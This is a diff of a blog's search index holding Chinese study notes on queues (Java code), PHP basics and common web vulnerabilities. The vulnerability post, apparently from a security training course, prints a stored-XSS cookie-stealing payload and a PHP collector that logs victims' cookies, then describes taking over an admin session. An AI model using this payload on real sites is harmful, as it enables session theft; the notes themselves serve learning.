@@ -1,6 +1,111 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>队列</title>
+    <url>/2020/05/09/%E9%98%9F%E5%88%97/</url>
+    <content><![CDATA[<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>先进者先出，队列中最基本的操作是：入队enqueue()【放一个数据到队尾】，出队dequeue()【从队列头部取一个数据】。</p>
+<h2 id="基础分类"><a href="#基础分类" class="headerlink" title="基础分类"></a>基础分类</h2><h3 id="顺序队列【数组实现】"><a href="#顺序队列【数组实现】" class="headerlink" title="顺序队列【数组实现】"></a>顺序队列【数组实现】</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用数组实现的队列</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayQueue</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 数组：items，数组大小：n</span></span><br><span class="line">  <span class="keyword">private</span> String[] items;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// head表示队头下标，tail表示队尾下标</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> head = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 申请一个大小为capacity的数组</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">    items = <span class="keyword">new</span> String[capacity];</span><br><span class="line">    n = capacity;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果tail == n 表示队列已经满了</span></span><br><span class="line">    <span class="keyword">if</span> (tail == n) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    items[tail] = item;</span><br><span class="line">    ++tail;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 出队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">dequeue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果head == tail 表示队列为空</span></span><br><span class="line">    <span class="keyword">if</span> (head == tail) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 为了让其他语言的同学看的更加明确，把--操作放到单独一行来写了</span></span><br><span class="line">    String ret = items[head];</span><br><span class="line">    ++head;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/09/%E9%98%9F%E5%88%97/1.jpg" alt="1"></p>
+<p><img src="/2020/05/09/%E9%98%9F%E5%88%97/2.jpg" alt="2"></p>
+<p>我们可以发现，进行几次入列出列的操作后，head和tail都会往后移动，那既然移动则无可避免地要到达数组的最大值，此时就要用到<strong>数据搬移</strong>。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// 入队操作，将item放入队尾</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// tail == n表示队列末尾没有空间了</span></span><br><span class="line">  <span class="keyword">if</span> (tail == n) &#123;</span><br><span class="line">    <span class="comment">// tail ==n &amp;&amp; head==0，表示整个队列都占满了</span></span><br><span class="line">    <span class="keyword">if</span> (head == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 数据搬移</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = head; i &lt; tail; ++i) &#123;</span><br><span class="line">      items[i-head] = items[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 搬移完之后重新更新head和tail</span></span><br><span class="line">    tail -= head;</span><br><span class="line">    head = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  items[tail] = item;</span><br><span class="line">  ++tail;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="链式队列【链表实现】"><a href="#链式队列【链表实现】" class="headerlink" title="链式队列【链表实现】"></a>链式队列【链表实现】</h3><p>而链表的入列出列操作就有点类似于链表的增删：</p>
+<p><img src="/2020/05/09/%E9%98%9F%E5%88%97/3.jpg" alt="3"></p>
+<h2 id="其他分类"><a href="#其他分类" class="headerlink" title="其他分类"></a>其他分类</h2><h3 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h3><p><img src="/2020/05/09/%E9%98%9F%E5%88%97/%E5%BE%AA%E7%8E%AF%E5%88%97%E8%A1%A8.jpg" alt="循环列表"></p>
+<p>对于循环列表来说，最重要的是确定<strong>队空条件</strong>和<strong>队满条件</strong>。</p>
+<ul>
+<li>队空条件：head==tail</li>
+<li>队满条件：(tail+1)%n==head</li>
+</ul>
+<blockquote>
+<p>队满条件之所以不直接使用“tail+1==head”是因为tail+1可能重新开始了一个循环。</p>
+<p>例如tail=n-1【7】，而head=0</p>
+</blockquote>
+<p><strong>show you code：</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CircularQueue</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 数组：items，数组大小：n</span></span><br><span class="line">  <span class="keyword">private</span> String[] items;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// head表示队头下标，tail表示队尾下标</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> head = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 申请一个大小为capacity的数组</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">CircularQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">    items = <span class="keyword">new</span> String[capacity];</span><br><span class="line">    n = capacity;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 队列满了</span></span><br><span class="line">    <span class="keyword">if</span> ((tail + <span class="number">1</span>) % n == head) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    items[tail] = item;</span><br><span class="line">    tail = (tail + <span class="number">1</span>) % n;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 出队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">dequeue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果head == tail 表示队列为空</span></span><br><span class="line">    <span class="keyword">if</span> (head == tail) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    String ret = items[head];</span><br><span class="line">    head = (head + <span class="number">1</span>) % n;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="阻塞队列"><a href="#阻塞队列" class="headerlink" title="阻塞队列"></a>阻塞队列</h3><p>队列空时，从头取数据会被阻塞，直到有了数据才会再取数据；队列满时，插入数据会被阻塞，直到有空闲位置才会再插入。</p>
+<p>就像一个“<strong>生产者消费者模型</strong>”！</p>
+<h3 id="并发队列"><a href="#并发队列" class="headerlink" title="并发队列"></a>并发队列</h3><p>指 线程安全的队列。</p>
+<blockquote>
+<p>最简单直接的实现方式是直接在 enqueue()、dequeue() 方法上加锁，但是锁粒度大并发度会比较低，同一时刻仅允许一个存或者取操作。实际上，基于数组的循环队列，利用 CAS 原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。在实战篇讲 Disruptor 的时候，我会再详细讲并发队列的应用。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>数据结构与算法之美</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>php基础</title>
+    <url>/2020/05/07/php%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h2 id="连接字符串与变量"><a href="#连接字符串与变量" class="headerlink" title="连接字符串与变量"></a>连接字符串与变量</h2><p>用.连接</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$name=<span class="string">'Ben'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'my name is'</span> .$name;</span><br></pre></td></tr></table></figure>
+
+<h2 id="定义常量"><a href="#定义常量" class="headerlink" title="定义常量"></a>定义常量</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define(<span class="string">'NAME'</span>,<span class="string">"Value"</span>);</span><br><span class="line"><span class="keyword">const</span> NAME=<span class="string">'Value'</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="自动分配下标"><a href="#自动分配下标" class="headerlink" title="自动分配下标"></a>自动分配下标</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$name = <span class="keyword">array</span>(<span class="string">"George"</span>,<span class="string">"Ben"</span>,<span class="string">"Carol"</span>);</span><br><span class="line"><span class="keyword">echo</span> $name[<span class="number">1</span>];</span><br></pre></td></tr></table></figure>
+
+<h3 id="手动分配下标"><a href="#手动分配下标" class="headerlink" title="手动分配下标"></a>手动分配下标</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$name = <span class="keyword">array</span>(<span class="string">"cool"</span>=&gt;<span class="string">"George"</span>,<span class="string">"stupid"</span>=&gt;<span class="string">"Ben"</span>,<span class="string">"beautiful"</span>=&gt;<span class="string">"Carol"</span>);</span><br><span class="line"><span class="keyword">echo</span> $name[<span class="string">'cool'</span>];</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h2><h3 id="自动分配下标-1"><a href="#自动分配下标-1" class="headerlink" title="自动分配下标"></a>自动分配下标</h3><p><img src="/2020/05/07/php%E5%9F%BA%E7%A1%80/Snipaste_2020-05-07_11-02-38.png" alt="2"></p>
+<h3 id="手动分配下标-1"><a href="#手动分配下标-1" class="headerlink" title="手动分配下标"></a>手动分配下标</h3><p><img src="/2020/05/07/php%E5%9F%BA%E7%A1%80/1.png" alt="1"></p>
+]]></content>
+      <categories>
+        <category>米斯特安全培训</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>web漏洞基本类型</title>
+    <url>/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/</url>
+    <content><![CDATA[<h1 id="HTML注入"><a href="#HTML注入" class="headerlink" title="HTML注入"></a>HTML注入</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxx.com?input&#x3D;&lt;h1&gt;key&lt;&#x2F;h1&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/html%E6%B3%A8%E5%85%A5.png" alt="html注入"></p>
+<p>把原有背景用白色覆盖，在上面加上自己的代码【将密码发给黑客的数据库】</p>
+<h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><h3 id="修复点"><a href="#修复点" class="headerlink" title="修复点"></a>修复点</h3><ol>
+<li>输入点</li>
+<li>输出点</li>
+</ol>
+<h3 id="修复函数"><a href="#修复函数" class="headerlink" title="修复函数"></a>修复函数</h3><p>用了之后htmlspecialchars()</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxx.com?input&#x3D;&lt;h1&gt;key&lt;&#x2F;h1&gt;</span><br></pre></td></tr></table></figure>
+
+<p>显示</p><h1>key</h1><p></p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h3><p>黑客向服务器提交一个请求【带有XSS代码】，服务器后台php处理这段代码【包括XSS代码】，然后服务器后台将处理好的页面发给黑客【包括XSS异常情况】。</p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>黑客向服务器提交一个请求【带有XSS代码】，服务器将请求【包括XSS代码】存储到数据库里【所以当时不会有反应】，当下次访问此数据库对象时，会发生XSS异常情况。</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>不发给服务器，仅在浏览器端操作。当存在document.url，document.write等属性时。</p>
+<h4 id="例子：获取留言板管理员的cookie"><a href="#例子：获取留言板管理员的cookie" class="headerlink" title="例子：获取留言板管理员的cookie"></a>例子：获取留言板管理员的cookie</h4><p>首先写一个getCookie.php，内容如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(file_put_contents(<span class="string">"cookie.txt"</span>,<span class="string">'Cookie:'</span>.$_GET[<span class="string">'cookie'</span>],<span class="string">'Location:'</span>.$_GET[<span class="string">'durl'</span>],FILE_APPEND))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在留言板内输入</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="built_in">document</span>.location.href=<span class="string">"http://127.0.0.1/getCookie.php?cookie="</span>+</span><br><span class="line">    <span class="built_in">document</span>.cookie+</span><br><span class="line">    <span class="string">"&amp;durl="</span>+</span><br><span class="line">    <span class="built_in">document</span>.url<span class="string">"   </span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时当管理员点开此留言时，他的url和cookie就会被发送到cookie.txt。</p>
+<p>我们通过url，使用cookie quick manager等插件修改cookie来登入管理员后台。</p>
+<h1 id="CSRF（cross-site-request-forgery）跨站请求伪造"><a href="#CSRF（cross-site-request-forgery）跨站请求伪造" class="headerlink" title="CSRF（cross-site request forgery）跨站请求伪造"></a>CSRF（cross-site request forgery）跨站请求伪造</h1><ol>
+<li>黑客了解过一个页面1后，自己写了一个文件，里面主要代码为表单的提交，表单中包含页面1里你想要修改的数据。</li>
+<li>黑客挂一个链接，链接到此页面。用户点击后，黑客即能利用用户的权限来实现一些东西【比如修改用户本人的密码】</li>
+</ol>
+<p><img src="/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/csrf.png" alt="csrf"></p>
+<h1 id="SSRF（Server-side-request-forgery）服务器端请求伪造"><a href="#SSRF（Server-side-request-forgery）服务器端请求伪造" class="headerlink" title="SSRF（Server-side request forgery）服务器端请求伪造"></a>SSRF（Server-side request forgery）服务器端请求伪造</h1><p>黑客利用服务器A作为跳板去访问服务器B。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
+<h2 id="内网IP端口存活测试"><a href="#内网IP端口存活测试" class="headerlink" title="内网IP端口存活测试"></a>内网IP端口存活测试</h2><p><img src="/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/ssrf.png" alt="ssrf"></p>
+<p>其中ssrf_curl.php的代码是</p>
+<p><img src="/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/ssrfphp.png" alt="ssrfphp"></p>
+<p>其中关于curl的有关内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.runoob.com&#x2F;php&#x2F;php-ref-curl.html</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>米斯特安全培训</category>
+      </categories>
+  </entry>
+  <entry>
     <title>栈</title>
     <url>/2020/05/02/%E6%A0%88/</url>
     <content><![CDATA[<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>一句话：后进者先出，先进者后出。</p>
